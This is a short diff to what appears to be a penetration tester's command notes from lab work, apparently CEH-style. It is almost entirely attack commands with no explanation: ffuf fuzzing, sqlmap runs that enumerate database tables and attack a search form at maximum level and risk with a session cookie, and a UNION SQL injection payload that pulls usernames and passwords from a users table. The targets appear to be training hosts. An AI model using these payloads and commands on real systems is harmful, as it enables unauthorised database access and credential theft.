@@ -26,3 +26,12 @@ ffuf -u http://192.168.44.40/FUZZ.php?id=1 -w /usr/share/wordlists/dirb/common.t
 sqlmap -r /home/attacker/Documents/burp_request.txt -p id -D devilcorp --tables --batch
 
 document.body.innerText.match(/\b\d\*[a-zA-Z]\*[a-zA-Z]\b/)
+
+txtsearch=asdf' UNION SELECT NULL, username, password FROM users WHERE username='Matthew'--
+
+sqlmap -u "http://cinema.cehorg.com/search.aspx" \
+--data="txtsearch=asdf&form_titles=0" \
+--cookie="mscope=KAp/1eKUZTg=" \
+--level=5 --risk=3 --technique=U --batch
+
+
